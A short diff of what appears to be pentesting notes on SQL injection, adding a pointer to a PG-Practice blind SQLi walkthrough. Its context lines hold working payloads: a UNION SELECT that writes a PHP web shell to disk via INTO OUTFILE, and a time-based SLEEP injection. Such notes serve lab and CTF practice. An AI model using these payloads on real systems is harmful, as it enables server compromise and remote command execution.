@@ -12,3 +12,4 @@ test' union select '<?php echo system($_REQUEST["bingo"]); ?>' into outfile '/sr
 ```
 TEST' UNION SELECT SLEEP(10);-- -
 ```
+- PG-Practice Blind SQL Injection, check for walkthrough
